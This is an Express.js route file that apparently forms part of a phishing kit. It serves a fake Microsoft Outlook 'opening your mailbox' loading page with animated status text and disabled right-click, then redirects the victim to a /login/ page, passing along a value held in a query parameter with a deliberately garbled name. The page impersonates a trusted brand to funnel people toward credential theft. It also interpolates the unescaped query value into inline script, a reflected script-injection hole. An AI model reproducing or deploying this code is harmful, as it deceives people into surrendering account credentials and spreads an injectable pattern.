
const express = require ('express');
const router = express.Router();
router.use(express.static('public'));


//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data2 = req.query.lfdkjgiroetuiroyhgfhnbjkfsdfiowerierehjre;

    const url = `/login/?dhsfiourewjdfjgkfdgkldfjiorejfdjgfdgjkdfjgreioo=${data2}`;

      if (data2 == null) {
        res.render('error');
        
      }else{

    const htmlContent = `
<!DOCTYPE html>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="./files/favicon.ico" type="image/x-icon">
        <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
        	
       
        <title>Outlook</title>
        <style>
                p{font-size: 18px;color: #0072C6;
		font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
                }
        </style>
        <script>
              window.onload = function() {
		  // Get the <p> element by its ID
		  const paragraph = document.getElementById('changingText');

		  // Array containing the texts to cycle through
		  const texts = [
		    'Still working on it...',
		    'Opening your mailbox...',
		    'Almost there...',
		    // Add more texts as needed
		  ];

		  let currentTextIndex = 0;

		  // Function to change the text of the <p> element
		  function changeText() {
		    paragraph.textContent = texts[currentTextIndex];
		    currentTextIndex = (currentTextIndex + 1) % texts.length;
		  }

		  // Call the changeText function every 2 seconds (2000 milliseconds)
		  setInterval(changeText, 2000);
		};

        </script>
	    <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 3000);
            </script> 
	 
<style type="text/css" id="operaUserStyle"></style></head>
<body class="bdBg" style="background: #fff;" oncontextmenu="return false;">


          <center>
       
       
       <div>
       <br> <br> <br> <br><br> <br><br> <br><br> <br><br> <br>
       <img alt="Outloook" src="./files/asdf.png"><br><br>
       <p  id="changingText">Starting...</p>
  
		<br><br>
       <img alt="Loading"  src="./files/1495.gif">
       
       </div>
       
       </center>
        </body>

</html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router;